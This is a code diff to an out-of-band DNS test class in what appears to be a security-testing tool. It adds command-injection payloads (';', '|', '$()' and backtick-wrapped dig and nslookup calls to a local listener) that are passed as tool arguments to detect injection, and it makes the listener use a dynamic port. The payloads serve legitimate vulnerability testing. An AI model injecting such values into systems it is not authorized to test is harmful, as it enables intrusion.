@@ -14,11 +14,24 @@ class OOBTest:
     def __init__(self, pentester):
         self.pentester = pentester
         self.dns_server = None
-        self.dns_port = 5353
+        self.dns_host = "127.0.0.1"
+        # Bind an ephemeral port by default to avoid conflicts. A fixed port can
+        # still be supplied through config["oob_dns_port"] when needed.
+        self.dns_port = int(pentester.config.get("oob_dns_port", 0))
         self.captured_queries = {}
 
     DNS_PAYLOADS = [
-        # Command substitution with DNS
+        # Command substitution with DNS. Prefer payloads that can target the
+        # dynamically selected listener port, then fall back to default DNS port
+        # variants for environments where those tools/options are unavailable.
+        "; dig @{dns_host} -p {dns_port} {token}.oob.local",
+        "| dig @{dns_host} -p {dns_port} {token}.oob.local",
+        "$(dig @{dns_host} -p {dns_port} {token}.oob.local)",
+        "`dig @{dns_host} -p {dns_port} {token}.oob.local`",
+        "; nslookup -port={dns_port} {token}.oob.local {dns_host}",
+        "| nslookup -port={dns_port} {token}.oob.local {dns_host}",
+        "$(nslookup -port={dns_port} {token}.oob.local {dns_host})",
+        "`nslookup -port={dns_port} {token}.oob.local {dns_host}`",
         "; nslookup {token}.oob.local 127.0.0.1",
         "| nslookup {token}.oob.local 127.0.0.1",
         "$(nslookup {token}.oob.local 127.0.0.1)",
@@ -76,6 +89,8 @@ class OOBTest:
                 super().server_bind()
 
         self.dns_server = ReuseUDPServer(("0.0.0.0", self.dns_port), DNSHandler)
+        self.dns_port = self.dns_server.server_address[1]
+        logging.debug("OOB DNS listener started on UDP port %s", self.dns_port)
         thread = threading.Thread(target=self.dns_server.serve_forever, daemon=True)
         thread.start()
 
@@ -94,7 +109,9 @@ class OOBTest:
             for payload_template in self.DNS_PAYLOADS:
                 token = str(uuid.uuid4())[:8]
                 self.captured_queries[token] = None
-                payload = payload_template.format(token=token)
+                payload = payload_template.format(
+                    token=token, dns_host=self.dns_host, dns_port=self.dns_port
+                )
 
                 try:
                     params = {"name": tool["name"], "arguments": {arg: payload}}
@@ -136,4 +153,8 @@ class OOBTest:
             except Exception as e:
                 logging.debug(f"Error during DNS listener cleanup: {e}")
             finally:
+                try:
+                    self.dns_server.server_close()
+                except Exception as e:
+                    logging.debug(f"Error closing DNS listener socket: {e}")
                 self.dns_server = None
